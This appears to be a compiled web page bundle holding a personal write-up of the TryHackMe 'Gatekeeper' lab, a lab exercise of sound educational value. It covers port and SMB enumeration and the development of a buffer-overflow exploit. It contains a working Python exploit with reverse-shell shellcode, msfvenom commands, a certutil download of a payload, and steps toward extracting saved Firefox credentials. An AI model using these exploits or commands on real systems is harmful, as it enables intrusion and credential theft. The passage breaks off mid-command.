"use strict";(self.webpackChunkronamosa_github_io=self.webpackChunkronamosa_github_io||[]).push([[23358],{15680:(e,n,a)=>{a.d(n,{xA:()=>c,yg:()=>g});var t=a(96540);function r(e,n,a){return n in e?Object.defineProperty(e,n,{value:a,enumerable:!0,configurable:!0,writable:!0}):e[n]=a,e}function o(e,n){var a=Object.keys(e);if(Object.getOwnPropertySymbols){var t=Object.getOwnPropertySymbols(e);n&&(t=t.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),a.push.apply(a,t)}return a}function l(e){for(var n=1;n<arguments.length;n++){var a=null!=arguments[n]?arguments[n]:{};n%2?o(Object(a),!0).forEach((function(n){r(e,n,a[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(a)):o(Object(a)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(a,n))}))}return e}function s(e,n){if(null==e)return{};var a,t,r=function(e,n){if(null==e)return{};var a,t,r={},o=Object.keys(e);for(t=0;t<o.length;t++)a=o[t],n.indexOf(a)>=0||(r[a]=e[a]);return r}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(t=0;t<o.length;t++)a=o[t],n.indexOf(a)>=0||Object.prototype.propertyIsEnumerable.call(e,a)&&(r[a]=e[a])}return r}var i=t.createContext({}),p=function(e){var n=t.useContext(i),a=n;return e&&(a="function"==typeof e?e(n):l(l({},n),e)),a},c=function(e){var n=p(e.components);return t.createElement(i.Provider,{value:n},e.children)},x="mdxType",d={inlineCode:"code",wrapper:function(e){var n=e.children;return t.createElement(t.Fragment,{},n)}},m=t.forwardRef((function(e,n){var a=e.components,r=e.mdxType,o=e.originalType,i=e.parentName,c=s(e,["components","mdxType","originalType","parentName"]),x=p(a),m=r,g=x["".concat(i,".").concat(m)]||x[m]||d[m]||o;return a?t.createElement(g,l(l({ref:n},c),{},{components:a})):t.createElement(g,l({ref:n},c))}));function g(e,n){var a=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var o=a.length,l=new Array(o);l[0]=m;var s={};for(var i in n)hasOwnProperty.call(n,i)&&(s[i]=n[i]);s.originalType=e,s[x]="string"==typeof e?e:r,l[1]=s;for(var p=2;p<o;p++)l[p]=a[p];return t.createElement.apply(null,l)}return t.createElement.apply(null,a)}m.displayName="MDXCreateElement"},7799:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>i,contentTitle:()=>l,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>p});var t=a(58168),r=(a(96540),a(15680));const o={title:"Gatekeeper"},l=void 0,s={unversionedId:"hacker/tryhackme/gatekeeper",id:"hacker/tryhackme/gatekeeper",title:"Gatekeeper",description:"These are my notes for the Gatekeeper Room on TryHackMe.",source:"@site/docs/hacker/tryhackme/gatekeeper.md",sourceDirName:"hacker/tryhackme",slug:"/hacker/tryhackme/gatekeeper",permalink:"/docs/hacker/tryhackme/gatekeeper",draft:!1,editUrl:"https://github.com/ronamosa/ronamosa.github.io/edit/main/website/docs/hacker/tryhackme/gatekeeper.md",tags:[],version:"current",frontMatter:{title:"Gatekeeper"},sidebar:"docsSidebar",previous:{title:"Cyborg",permalink:"/docs/hacker/tryhackme/cyborg"},next:{title:"Holo Live",permalink:"/docs/hacker/tryhackme/hololive"}},i={},p=[{value:"RECON",id:"recon",level:2},{value:"Scan",id:"scan",level:3},{value:"Enumerate",id:"enumerate",level:3},{value:"EXPLOIT",id:"exploit",level:2},{value:"Buffer Overflow Development",id:"buffer-overflow-development",level:3},{value:"Find the Offset",id:"find-the-offset",level:3},{value:"Control the EIP",id:"control-the-eip",level:3},{value:"Bad Character Check",id:"bad-character-check",level:3},{value:"Find the jmp Return Address",id:"find-the-jmp-return-address",level:3},{value:"Shellcode: Local Box",id:"shellcode-local-box",level:3},{value:"Shellcode: TryHackMe Box",id:"shellcode-tryhackme-box",level:3},{value:"Flag: user.txt",id:"flag-usertxt",level:3},{value:"PRIVESC",id:"privesc",level:2},{value:"Attempt: Run as Admin",id:"attempt-run-as-admin",level:3},{value:"Attempt: Firefox.lnk",id:"attempt-firefoxlnk",level:3},{value:"Firepwd.py",id:"firepwdpy",level:3},{value:"Decrypt firefox logins",id:"decrypt-firefox-logins",level:4},{value:"Flag: root.txt",id:"flag-roottxt",level:3}],c={toc:p},x="wrapper";function d(e){let{components:n,...a}=e;return(0,r.yg)(x,(0,t.A)({},c,a,{components:n,mdxType:"MDXLayout"}),(0,r.yg)("admonition",{title:"Description",type:"info"},(0,r.yg)("p",{parentName:"admonition"},"These are my notes for the ",(0,r.yg)("a",{parentName:"p",href:"https://tryhackme.com/room/gatekeeper"},"Gatekeeper Room")," on TryHackMe."),(0,r.yg)("p",{parentName:"admonition"},"Credits: S/o to SnoOw, Kafka and Noodles for the assist on this box."),(0,r.yg)("table",{parentName:"admonition"},(0,r.yg)("thead",{parentName:"table"},(0,r.yg)("tr",{parentName:"thead"},(0,r.yg)("th",{parentName:"tr",align:"center"},"OS"),(0,r.yg)("th",{parentName:"tr",align:"center"},"Level"),(0,r.yg)("th",{parentName:"tr",align:"center"},"Rating"))),(0,r.yg)("tbody",{parentName:"table"},(0,r.yg)("tr",{parentName:"tbody"},(0,r.yg)("td",{parentName:"tr",align:"center"},"Windows"),(0,r.yg)("td",{parentName:"tr",align:"center"},"Medium"),(0,r.yg)("td",{parentName:"tr",align:"center"},"4/5"))))),(0,r.yg)("h2",{id:"recon"},"RECON"),(0,r.yg)("h3",{id:"scan"},"Scan"),(0,r.yg)("p",null,"Initial recon with an nmap scan: ",(0,r.yg)("inlineCode",{parentName:"p"},"nmap -v -sV -Pn -p-54000 -o nmap-gatekeeper.txt $TARGET_IP")),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},'# Nmap 7.92 scan initiated Tue Mar  1 20:43:11 2022 as: nmap -v -sV -Pn -p-54000 -o nmap-gatekeeper.txt 10.10.51.255\nIncreasing send delay for 10.10.51.255 from 0 to 5 due to 11 out of 31 dropped probes since last increase.\nIncreasing send delay for 10.10.51.255 from 80 to 160 due to 11 out of 12 dropped probes since last increase.\nNmap scan report for 10.10.51.255\nHost is up (0.28s latency).\nNot shown: 53989 closed tcp ports (conn-refused)\nPORT      STATE SERVICE            VERSION\n135/tcp   open  msrpc              Microsoft Windows RPC\n139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\n3389/tcp  open  ssl/ms-wbt-server?\n31337/tcp open  Elite?\n49152/tcp open  msrpc              Microsoft Windows RPC\n49153/tcp open  msrpc              Microsoft Windows RPC\n49154/tcp open  msrpc              Microsoft Windows RPC\n49155/tcp open  msrpc              Microsoft Windows RPC\n49163/tcp open  msrpc              Microsoft Windows RPC\n49165/tcp open  msrpc              Microsoft Windows RPC\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port31337-TCP:V=7.92%I=7%D=3/1%Time=621DDD81%P=x86_64-pc-linux-gnu%r(Ge\nSF:tRequest,24,"Hello\\x20GET\\x20/\\x20HTTP/1\\.0\\r!!!\\nHello\\x20\\r!!!\\n")%r(\nSF:SIPOptions,142,"Hello\\x20OPTIONS\\x20sip:nm\\x20SIP/2\\.0\\r!!!\\nHello\\x20V\nSF:ia:\\x20SIP/2\\.0/TCP\\x20nm;branch=foo\\r!!!\\nHello\\x20From:\\x20<sip:nm@nm\nSF:>;tag=root\\r!!!\\nHello\\x20To:\\x20<sip:nm2@nm2>\\r!!!\\nHello\\x20Call-ID:\\\nSF:x2050000\\r!!!\\nHello\\x20CSeq:\\x2042\\x20OPTIONS\\r!!!\\nHello\\x20Max-Forwa\nSF:rds:\\x2070\\r!!!\\nHello\\x20Content-Length:\\x200\\r!!!\\nHello\\x20Contact:\\\nSF:x20<sip:nm@nm>\\r!!!\\nHello\\x20Accept:\\x20application/sdp\\r!!!\\nHello\\x2\nSF:0\\r!!!\\n")%r(GenericLines,16,"Hello\\x20\\r!!!\\nHello\\x20\\r!!!\\n")%r(HTTP\nSF:Options,28,"Hello\\x20OPTIONS\\x20/\\x20HTTP/1\\.0\\r!!!\\nHello\\x20\\r!!!\\n")\nSF:%r(RTSPRequest,28,"Hello\\x20OPTIONS\\x20/\\x20RTSP/1\\.0\\r!!!\\nHello\\x20\\r\nSF:!!!\\n")%r(Help,F,"Hello\\x20HELP\\r!!!\\n")%r(SSLSessionReq,C,"Hello\\x20\\x\nSF:16\\x03!!!\\n")%r(TerminalServerCookie,B,"Hello\\x20\\x03!!!\\n")%r(TLSSessi\nSF:onReq,C,"Hello\\x20\\x16\\x03!!!\\n")%r(Kerberos,A,"Hello\\x20!!!\\n")%r(Four\nSF:OhFourRequest,47,"Hello\\x20GET\\x20/nice%20ports%2C/Tri%6Eity\\.txt%2ebak\nSF:\\x20HTTP/1\\.0\\r!!!\\nHello\\x20\\r!!!\\n")%r(LPDString,12,"Hello\\x20\\x01def\nSF:ault!!!\\n")%r(LDAPSearchReq,17,"Hello\\x200\\x84!!!\\nHello\\x20\\x01!!!\\n");\nService Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Tue Mar  1 21:49:31 2022 -- 1 IP address (1 host up) scanned in 3980.16 seconds\n')),(0,r.yg)("h3",{id:"enumerate"},"Enumerate"),(0,r.yg)("p",null,"I can see the 135, 139 ports are open so let's try ",(0,r.yg)("inlineCode",{parentName:"p"},"smbclient"),": ",(0,r.yg)("inlineCode",{parentName:"p"},"smbclient -L //$TARGET_IP")),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"smbclient -L //10.10.51.255\nEnter WORKGROUP\\kali's password: \n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        Users           Disk      \nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 10.10.51.255 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)\nUnable to connect with SMB1 -- no workgroup available\n")),(0,r.yg)("p",null,"now try ",(0,r.yg)("inlineCode",{parentName:"p"},"nmblookup"),": ",(0,r.yg)("inlineCode",{parentName:"p"},"nmblookup -A $TARGET_IP")),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"nmblookup -A 10.10.51.255\nLooking up status of 10.10.51.255\n        GATEKEEPER      <00> -         B <ACTIVE> \n        WORKGROUP       <00> - <GROUP> B <ACTIVE> \n        GATEKEEPER      <20> -         B <ACTIVE> \n        WORKGROUP       <1e> - <GROUP> B <ACTIVE> \n        WORKGROUP       <1d> -         B <ACTIVE> \n        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE> \n\n        MAC Address = 02-FD-26-02-B7-53\n")),(0,r.yg)("p",null,"try nmap with smb-enumeration-shares script scanning: ",(0,r.yg)("inlineCode",{parentName:"p"},"nmap --script smb-enum-shares -p 139,445 $TARGET_IP")),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"nmap --script smb-enum-shares -p 139,445 10.10.51.255\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-03-01 20:20 NZDT\nNmap scan report for 10.10.51.255\nHost is up (0.28s latency).\n\nPORT    STATE SERVICE\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\n\nHost script results:\n| smb-enum-shares: \n|   account_used: guest\n|   \\\\10.10.51.255\\ADMIN$: \n|     Type: STYPE_DISKTREE_HIDDEN\n|     Comment: Remote Admin\n|     Anonymous access: <none>\n|     Current user access: <none>\n|   \\\\10.10.51.255\\C$: \n|     Type: STYPE_DISKTREE_HIDDEN\n|     Comment: Default share\n|     Anonymous access: <none>\n|     Current user access: <none>\n|   \\\\10.10.51.255\\IPC$: \n|     Type: STYPE_IPC_HIDDEN\n|     Comment: Remote IPC\n|     Anonymous access: READ\n|     Current user access: READ/WRITE\n|   \\\\10.10.51.255\\Users: \n|     Type: STYPE_DISKTREE\n|     Comment: \n|     Anonymous access: <none>\n|_    Current user access: READ\n\nNmap done: 1 IP address (1 host up) scanned in 52.79 seconds\n")),(0,r.yg)("p",null,"try nmap with smb-vuln scanning: ",(0,r.yg)("inlineCode",{parentName:"p"},"nmap --script smb-vuln* -p 139,445 $TARGET_IP")),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"nmap --script smb-vuln* -p 139,445 10.10.51.255\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-03-01 20:23 NZDT\nNmap scan report for 10.10.51.255\nHost is up (0.28s latency).\n\nPORT    STATE SERVICE\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\n\nHost script results:\n|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND\n|_smb-vuln-ms10-054: false\n\nNmap done: 1 IP address (1 host up) scanned in 11.47 seconds\n")),(0,r.yg)("p",null,"From nmap we can see this port open ",(0,r.yg)("inlineCode",{parentName:"p"},"31337")," - let's try connecting to it:"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"nc 10.10.51.255 31337                                                                                     130 \u2a2f\n\nHello !!!\nhi\nHello hi!!!\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nHello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!!!\n^C\n")),(0,r.yg)("p",null,"Looks like it takes user input, buffer overflow potential."),(0,r.yg)("p",null,"Let's use smbclient to connect, maybe browse the shares that have read access:"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},'\u250c\u2500\u2500(kali\u327fkali)-[~/\u2026/RxHack/THM/OFFENSIVEPENTESTPATH/GATEKEEPER]\n\u2514\u2500$ smbclient //10.10.51.255/Users -U anonymous -W WORKGROUP\nEnter WORKGROUP\\anonymous\'s password: \nTry "help" to get a list of possible commands.\nsmb: \\> dir\n  .                                  DR        0  Fri May 15 13:57:08 2020\n  ..                                 DR        0  Fri May 15 13:57:08 2020\n  Default                           DHR        0  Tue Jul 14 19:07:31 2009\n  desktop.ini                       AHS      174  Tue Jul 14 16:54:24 2009\n  Share                               D        0  Fri May 15 13:58:07 2020\n\n                7863807 blocks of size 4096. 3874921 blocks available\nsmb: \\> cd Share\ndismb: \\Share\\> dir\n  .                                   D        0  Fri May 15 13:58:07 2020\n  ..                                  D        0  Fri May 15 13:58:07 2020\n  gatekeeper.exe                      A    13312  Mon Apr 20 17:27:17 2020\n\n                7863807 blocks of size 4096. 3874921 blocks available\nsmb: \\Share\\> exit\n')),(0,r.yg)("p",null,"Downloaded ",(0,r.yg)("inlineCode",{parentName:"p"},"gatekeeper.exe"),", ran it on win7 box, but had to install M$ visual studio C++ (vc_redist.x86.exe) to get the program working."),(0,r.yg)("h2",{id:"exploit"},"EXPLOIT"),(0,r.yg)("h3",{id:"buffer-overflow-development"},"Buffer Overflow Development"),(0,r.yg)("p",null,"The scenario here is we have a target machine at THM, but now we have a copy of the application we can run locally, and figure out a buffer overflow exploit/payload, which we will in turn fire at the THM machine."),(0,r.yg)("h3",{id:"find-the-offset"},"Find the Offset"),(0,r.yg)("admonition",{type:"tip"},(0,r.yg)("p",{parentName:"admonition"},"Tip from noodles: do ",(0,r.yg)("inlineCode",{parentName:"p"},"offset.py")," script with a big-ass number, use ",(0,r.yg)("inlineCode",{parentName:"p"},"pattern_create.rb -l <big number>")," then ",(0,r.yg)("inlineCode",{parentName:"p"},"pattern_offset.rb -l <big number> -q <EIP>")," gives you the offset.")),(0,r.yg)("p",null,"Follow ",(0,r.yg)("a",{parentName:"p",href:"/docs/hacker/bufferoverflow/resources"},"Buffer Overflow Shortcut")," for the full technique."),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 6700 -q 39654138                       130 \u2a2f\n[*] Exact match at offset 146\n")),(0,r.yg)("h3",{id:"control-the-eip"},"Control the EIP"),(0,r.yg)("p",null,"Use this script to prove our offset is accurate and the EIP is overwritten with the 4x B's we put in the payload:"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-python"},'#!/usr/bin/env python3\n\nimport socket\n\nip = "172.16.2.125" # note this is my local win7 vm ip address.\nport = 31337\n\noffset = 146\noverflow = "A" * offset\nretn = "BBBB"\npadding = ""\npayload = ""\npostfix = ""\n\nbuffer = overflow + retn + padding + payload + postfix\n\nprint("buffer=",len(buffer))\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print("Crash Overwrite EIP: 42424242...")\n  s.send(bytes(buffer + "\\r\\n", "latin-1"))\n  print("Done!")\nexcept:\n  print("Could not connect.")\n\n')),(0,r.yg)("p",null,"Run it!"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"./eip.py   \nbuffer= 150\nCrash Overwrite EIP: 42424242...\nDone!\n")),(0,r.yg)("h3",{id:"bad-character-check"},"Bad Character Check"),(0,r.yg)("p",null,"Run through the bad character check process starting with the nullbyte array (",(0,r.yg)("inlineCode",{parentName:"p"},'!mona bytearray -b "\\x00"'),")."),(0,r.yg)("p",null,"Then compare:"),(0,r.yg)("p",null,(0,r.yg)("inlineCode",{parentName:"p"},"!mona compare -f C:\\Users\\IEUser\\Downloads\\gatekeeper\\bytearray.bin -a 015419F8")),(0,r.yg)("p",null,"get a bad character list : ",(0,r.yg)("inlineCode",{parentName:"p"},"00 0a")),(0,r.yg)("p",null,"Generate a new bytearray with the new found bad characters:"),(0,r.yg)("p",null,(0,r.yg)("inlineCode",{parentName:"p"},'!mona bytearray -b "\\x00\\x0a"')),(0,r.yg)("p",null,"Compare:"),(0,r.yg)("p",null,(0,r.yg)("inlineCode",{parentName:"p"},"!mona compare -f C:\\Users\\IEUser\\Downloads\\gatekeeper\\bytearray.bin -a 014D19F8")),(0,r.yg)("p",null,"Booya!"),(0,r.yg)("h3",{id:"find-the-jmp-return-address"},"Find the jmp Return Address"),(0,r.yg)("p",null,'Find a module that doesn\'t have "Address Space Layout Randomization (ASLR)" memory protection:'),(0,r.yg)("p",null,(0,r.yg)("inlineCode",{parentName:"p"},'!mona jmp -r esp -cpb "\\x00\\x0a"')),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"Log data, item 4\n Address=080414C3\n Message=  0x080414c3 : jmp esp |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\\Users\\IEUser\\Downloads\\gatekeeper.exe)\n\nLog data, item 3\n Address=080416BF\n Message=  0x080416bf : jmp esp |  {PAGE_EXECUTE_READ} [gatekeeper.exe] ASLR: False, Rebase: False, SafeSEH: True, OS: False, v-1.0- (C:\\Users\\IEUser\\Downloads\\gatekeeper.exe)\n")),(0,r.yg)("p",null,"Pick one."),(0,r.yg)("p",null,"I choose ",(0,r.yg)("inlineCode",{parentName:"p"},"080414C3")," = little endian = ",(0,r.yg)("inlineCode",{parentName:"p"},"\\xc3\\x14\\x04\\x08")),(0,r.yg)("h3",{id:"shellcode-local-box"},"Shellcode: Local Box"),(0,r.yg)("p",null,"Let's generate shellcode, minus the bad characters we've identified, with a reverse tcp shell, to connect back to a listener under our control."),(0,r.yg)("p",null,(0,r.yg)("inlineCode",{parentName:"p"},'msfvenom -p windows/shell_reverse_tcp LHOST=$LAN_IP LPORT=80 EXITFUNC=thread -b "\\x00\\x0a" -f c')),(0,r.yg)("ul",null,(0,r.yg)("li",{parentName:"ul"},(0,r.yg)("inlineCode",{parentName:"li"},"LHOST")," is our local interface e.g. eth0"),(0,r.yg)("li",{parentName:"ul"},"we want port ",(0,r.yg)("inlineCode",{parentName:"li"},"80")," to avoid detection"),(0,r.yg)("li",{parentName:"ul"},(0,r.yg)("inlineCode",{parentName:"li"},"-b")," dont use these characters for the shellcode"),(0,r.yg)("li",{parentName:"ul"},(0,r.yg)("inlineCode",{parentName:"li"},"-f")," format is C")),(0,r.yg)("p",null,"run our listener in another terminal session- and when you run the exploit with your shellcode:"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-python",metastring:'title="./payload-dev.py"',title:'"./payload-dev.py"'},'\n#!/usr/bin/env python3\n\nimport socket\n\nip = "172.16.2.125"\nport = 31337\n\noffset = 146\noverflow = "A" * offset\nretn = "\\xc3\\x14\\x04\\x08" # found using mona\npadding = "\\x90" * 16\npayload = (\n"\\xbd\\xc6\\x4a\\xb9\\xb1\\xdb\\xde\\xd9\\x74\\x24\\xf4\\x58\\x29\\xc9\\xb1"\n"\\x52\\x31\\x68\\x12\\x83\\xc0\\x04\\x03\\xae\\x44\\x5b\\x44\\xd2\\xb1\\x19"\n"\\xa7\\x2a\\x42\\x7e\\x21\\xcf\\x73\\xbe\\x55\\x84\\x24\\x0e\\x1d\\xc8\\xc8"\n"\\xe5\\x73\\xf8\\x5b\\x8b\\x5b\\x0f\\xeb\\x26\\xba\\x3e\\xec\\x1b\\xfe\\x21"\n"\\x6e\\x66\\xd3\\x81\\x4f\\xa9\\x26\\xc0\\x88\\xd4\\xcb\\x90\\x41\\x92\\x7e"\n"\\x04\\xe5\\xee\\x42\\xaf\\xb5\\xff\\xc2\\x4c\\x0d\\x01\\xe2\\xc3\\x05\\x58"\n"\\x24\\xe2\\xca\\xd0\\x6d\\xfc\\x0f\\xdc\\x24\\x77\\xfb\\xaa\\xb6\\x51\\x35"\n"\\x52\\x14\\x9c\\xf9\\xa1\\x64\\xd9\\x3e\\x5a\\x13\\x13\\x3d\\xe7\\x24\\xe0"\n"\\x3f\\x33\\xa0\\xf2\\x98\\xb0\\x12\\xde\\x19\\x14\\xc4\\x95\\x16\\xd1\\x82"\n"\\xf1\\x3a\\xe4\\x47\\x8a\\x47\\x6d\\x66\\x5c\\xce\\x35\\x4d\\x78\\x8a\\xee"\n"\\xec\\xd9\\x76\\x40\\x10\\x39\\xd9\\x3d\\xb4\\x32\\xf4\\x2a\\xc5\\x19\\x91"\n"\\x9f\\xe4\\xa1\\x61\\x88\\x7f\\xd2\\x53\\x17\\xd4\\x7c\\xd8\\xd0\\xf2\\x7b"\n"\\x1f\\xcb\\x43\\x13\\xde\\xf4\\xb3\\x3a\\x25\\xa0\\xe3\\x54\\x8c\\xc9\\x6f"\n"\\xa4\\x31\\x1c\\x3f\\xf4\\x9d\\xcf\\x80\\xa4\\x5d\\xa0\\x68\\xae\\x51\\x9f"\n"\\x89\\xd1\\xbb\\x88\\x20\\x28\\x2c\\x1b\\xa4\\x30\\xc6\\x0b\\xc7\\x34\\x16"\n"\\x9c\\x4e\\xd2\\x7c\\x0c\\x07\\x4d\\xe9\\xb5\\x02\\x05\\x88\\x3a\\x99\\x60"\n"\\x8a\\xb1\\x2e\\x95\\x45\\x32\\x5a\\x85\\x32\\xb2\\x11\\xf7\\x95\\xcd\\x8f"\n"\\x9f\\x7a\\x5f\\x54\\x5f\\xf4\\x7c\\xc3\\x08\\x51\\xb2\\x1a\\xdc\\x4f\\xed"\n"\\xb4\\xc2\\x8d\\x6b\\xfe\\x46\\x4a\\x48\\x01\\x47\\x1f\\xf4\\x25\\x57\\xd9"\n"\\xf5\\x61\\x03\\xb5\\xa3\\x3f\\xfd\\x73\\x1a\\x8e\\x57\\x2a\\xf1\\x58\\x3f"\n"\\xab\\x39\\x5b\\x39\\xb4\\x17\\x2d\\xa5\\x05\\xce\\x68\\xda\\xaa\\x86\\x7c"\n"\\xa3\\xd6\\x36\\x82\\x7e\\x53\\x56\\x61\\xaa\\xae\\xff\\x3c\\x3f\\x13\\x62"\n"\\xbf\\xea\\x50\\x9b\\x3c\\x1e\\x29\\x58\\x5c\\x6b\\x2c\\x24\\xda\\x80\\x5c"\n"\\x35\\x8f\\xa6\\xf3\\x36\\x9a"\n)\npostfix = ""\n\nbuffer = overflow + retn + padding + payload + postfix\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n  s.connect((ip, port))\n  print("Sending evil buffer...")\n  s.send(bytes(buffer + "\\r\\n", "latin-1"))\n  print("Done!")\nexcept:\n  print("Could not connect.")\n')),(0,r.yg)("p",null,"you pop a shell and see the windows prompt!"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"sudo rlwrap nc -lnvp 80                                                                                     1 \u2a2f\nlistening on [any] 80 ...\nconnect to [172.16.2.106] from (UNKNOWN) [172.16.2.125] 49360\nMicrosoft Windows [Version 6.1.7601]\nCopyright (c) 2009 Microsoft Corporation.  All rights reserved.\n\nC:\\Users\\IEUser\\Downloads>\n")),(0,r.yg)("p",null,"Now that it works on the local box, we can try with some level of confidence, a payload for the TryHackMe box."),(0,r.yg)("h3",{id:"shellcode-tryhackme-box"},"Shellcode: TryHackMe Box"),(0,r.yg)("p",null,"remember, change destination IP, and also LHOST in the msfvenom payload:"),(0,r.yg)("p",null,(0,r.yg)("inlineCode",{parentName:"p"},'msfvenom -p windows/shell_reverse_tcp LHOST=$VPN_IP LPORT=80 EXITFUNC=thread -b "\\x00\\x0a" -f c')),(0,r.yg)("ul",null,(0,r.yg)("li",{parentName:"ul"},(0,r.yg)("inlineCode",{parentName:"li"},"LHOST")," is our VPN interface (i.e. ",(0,r.yg)("inlineCode",{parentName:"li"},"tun0"),") so the THM box can see it"),(0,r.yg)("li",{parentName:"ul"},"we want port ",(0,r.yg)("inlineCode",{parentName:"li"},"80")," to avoid detection"),(0,r.yg)("li",{parentName:"ul"},(0,r.yg)("inlineCode",{parentName:"li"},"-b")," dont use these characters for the shellcode"),(0,r.yg)("li",{parentName:"ul"},(0,r.yg)("inlineCode",{parentName:"li"},"-f")," format is C")),(0,r.yg)("h3",{id:"flag-usertxt"},"Flag: user.txt"),(0,r.yg)("p",null,"Once you pop a shell on the THM box, you can find the flag under the natbat user's Desktop folder:"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-text"},'{**************}\n\nThe buffer overflow in this room is credited to Justin Steven and his \n"dostackbufferoverflowgood" program.  Thank you!\n')),(0,r.yg)("h2",{id:"privesc"},"PRIVESC"),(0,r.yg)("h3",{id:"attempt-run-as-admin"},"Attempt: Run as Admin"),(0,r.yg)("p",null,"One idea we had (team effort on Twitch), was replace the ",(0,r.yg)("inlineCode",{parentName:"p"},"gatekeeper.exe")," with a reverse shell, because there was a *.bat file that periodically started the gatekeeper service."),(0,r.yg)("p",null,"generate reverse shell exe to be run by Admin:"),(0,r.yg)("p",null,(0,r.yg)("inlineCode",{parentName:"p"},'msfvenom -p windows/shell_reverse_tcp LHOST=10.11.55.83 LPORT=80 EXITFUNC=thread -b "\\x00\\x0a" -f exe -o gatekee\nper.exe')),(0,r.yg)("p",null,"upload from the first reverse shell using certutil:"),(0,r.yg)("p",null,(0,r.yg)("inlineCode",{parentName:"p"},"certutil -urlcache -split -f http://$VPN_IP/gatekeeper.exe gatekeeper.exe")),(0,r.yg)("p",null,"didn't work- program ran as gatekeeper user, not admin."),(0,r.yg)("h3",{id:"attempt-firefoxlnk"},"Attempt: Firefox.lnk"),(0,r.yg)("p",null,"checking files for clues, see this ",(0,r.yg)("inlineCode",{parentName:"p"},"Firefox.lnk")," file:"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"type Desktop\\Firefox.lnk\nLF  j7j7        DGYr?DUk0~tCFSF1P AppDatatY^Hg3(\u07dfgVAGk\uff95PP*AppDataBL1P Local\uff95PP*TULocald1P MOZILL~1\uff95PP*sMozilla Firefox^2P5  firefox.exe\uff95PP*sfirefox.exe-8_K\u053e:C:\\Users\\'\\\\GATEKEEPER\\Usersnatbat\\AppData\\Local\\Mozilla Firefox\\firefox.exe,..\\AppData\\Local\\Mozilla Firefox\\firefox.exe-C:\\Users\\natbat\\AppData\\Local\\Mozilla Firefox\n                                                                                            |IJHK`Xgatekeeperj 8   }'t1j 8  1SPSXFL8C&mm.S-1-5-21-663372427-3699997616-3390412905-1003b1SPSU(Ly9K-\n\n                                                                              54B4832DCE3D0EB51\n")),(0,r.yg)("p",null,'Get to thinking "Firefox logins", google how to find firefox profiles and possible logins:'),(0,r.yg)("p",null,"In our reverse shell:"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},"dir logins.json /s /p                                                                                               \ndir logins.json /s /p                                                                                               \n Volume in drive C has no label.                                                                                    \n Volume Serial Number is 3ABE-D44B                                                                                  \n                                                                                                                    \n Directory of C:\\Users\\natbat\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljfn812a.default-release                     \n                                                                                                                    \n05/14/2020  09:43 PM               600 logins.json\n")),(0,r.yg)("p",null,"so we've found the profile folder, and the ",(0,r.yg)("inlineCode",{parentName:"p"},"logins.json")," file:"),(0,r.yg)("pre",null,(0,r.yg)("code",{parentName:"pre",className:"language-bash"},'type 